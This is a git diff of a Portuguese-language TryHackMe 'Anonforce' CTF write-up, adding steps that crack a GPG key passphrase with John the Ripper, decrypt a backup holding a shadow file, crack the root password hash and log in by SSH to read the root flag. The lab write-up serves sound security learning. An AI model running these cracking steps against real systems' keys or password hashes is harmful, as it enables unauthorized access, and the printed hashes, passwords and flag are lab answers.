@@ -2,9 +2,9 @@
 title: 'TryHackMe: Anonforce'
 author: Kertonli
 categories: [TryHackMe]
-tags: [Fácil ]
+tags: [Fácil, Nmap, Ftp, Gpg, John, Ssh ]
 image:
-  path: assets/images/tryhackme/basicpentesting/room.png
+  path: assets/images/tryhackme/anonforce/room.png
 ---
 
 # ALVO
@@ -117,11 +117,15 @@ Pegar também o arquivo user.txt dentro de home/melodias (ele possui a secret)
 
 # GPG
 
-Para resetar tudo do gpg: 
+(Para resetar tudo do gpg): 
 cp -r ~/.gnupg ~/.gnupg_backup
 rm -rf ~/.gnupg
 
 ```
+
+gpg --import private.asc
+
+gpg --decrypt backup.pgp
 
                        ┌───────────────────────────────────────────────────────────────┐
                        │ Please enter the passphrase to import the OpenPGP secret key: │
@@ -136,6 +140,134 @@ rm -rf ~/.gnupg
                        └───────────────────────────────────────────────────────────────┘
 
 
-Só colocar a secret do arquivo user.txt
+A senha não é a secret do user.txt então vamos tentar descobrir usando John
 
 ```
+
+# John
+
+```
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# ls
+backup.pgp  kertonlipenguin.ovpn  private.asc  user.txt
+                                                                                                               
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# gpg2john private.asc > hash                             
+
+File private.asc
+                                                                                                               
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# ls
+backup.pgp  hash  kertonlipenguin.ovpn  private.asc  user.txt
+                                                                                                               
+┌──(root㉿kali)-[/home/kali/Downloads]
+└─# john hash                                                
+Using default input encoding: UTF-8
+Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
+Cost 1 (s2k-count) is 65536 for all loaded hashes
+Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
+Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
+Will run 2 OpenMP threads
+Proceeding with single, rules:Single
+Press 'q' or Ctrl-C to abort, almost any other key for status
+Warning: Only 2 candidates buffered for the current salt, minimum 8 needed for performance.
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+xbox360          (anonforce)     
+1g 0:00:00:02 DONE 2/3 (2025-02-23 07:33) 0.4926g/s 7824p/s 7824c/s 7824C/s xbox360..madalina
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+```
+
+Ok, agora podemos descriptografar o arquivo
+
+```
+
+gpg --import private.asc
+gpg --decrypt backup.pgp
+
+
+└─# gpg --decrypt backup.pgp
+gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
+gpg: encrypted with 512-bit ELG key, ID AA6268D1E6612967, created 2019-08-12
+      "anonforce <melodias@anonforce.nsa>"
+root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
+daemon:*:17953:0:99999:7:::
+bin:*:17953:0:99999:7:::
+sys:*:17953:0:99999:7:::
+sync:*:17953:0:99999:7:::
+games:*:17953:0:99999:7:::
+man:*:17953:0:99999:7:::
+lp:*:17953:0:99999:7:::
+mail:*:17953:0:99999:7:::
+news:*:17953:0:99999:7:::
+uucp:*:17953:0:99999:7:::
+proxy:*:17953:0:99999:7:::
+www-data:*:17953:0:99999:7:::
+backup:*:17953:0:99999:7:::
+list:*:17953:0:99999:7:::
+irc:*:17953:0:99999:7:::
+gnats:*:17953:0:99999:7:::
+nobody:*:17953:0:99999:7:::
+systemd-timesync:*:17953:0:99999:7:::
+systemd-network:*:17953:0:99999:7:::
+systemd-resolve:*:17953:0:99999:7:::
+systemd-bus-proxy:*:17953:0:99999:7:::
+syslog:*:17953:0:99999:7:::
+_apt:*:17953:0:99999:7:::
+messagebus:*:18120:0:99999:7:::
+uuidd:*:18120:0:99999:7:::
+melodias:$1$xDhc6S6G$IQHUW5ZtMkBQ5pUMjEQtL1:18120:0:99999:7:::
+sshd:*:18120:0:99999:7:::
+ftp:*:18120:0:99999:7:::      
+
+```
+
+Ok agora tentar encontrar essa senha do root com força bruta novamente. Ajudando o john dizendo que é 512 bits e passando uma wordlist que é mais fácil de achar.
+
+```
+cat hash2.txt
+root:$6$07nYFaYf$F4VMaegmz7dKjsTukBLh6cP01iMmL7CiQDt1ycIm6a.bsOIBp0DwXVb9XI2EtULXJzBtaMZMNd2tV4uob5RVM0:18120:0:99999:7:::
+
+──(root㉿kali)-[/home/kali/Downloads]
+└─# john hash2.txt --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt
+Using default input encoding: UTF-8
+Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
+Cost 1 (iteration count) is 5000 for all loaded hashes
+Will run 2 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hikari           (root)     
+1g 0:00:00:03 DONE (2025-02-23 07:51) 0.2666g/s 1843p/s 1843c/s 1843C/s 98765432..better
+Warning: passwords printed above might not be all those cracked
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+
+```
+
+# SSH
+
+```
+ssh root@10.10.79.128       
+root@10.10.79.128's password: 
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-157-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+root@ubuntu:~# ls
+root.txt
+root@ubuntu:~# cat root.txt
+f706456440c7af4187810c31c6cebdce
+
+```
+
+![alt text](assets/images/tryhackme/anonforce/complete.png)
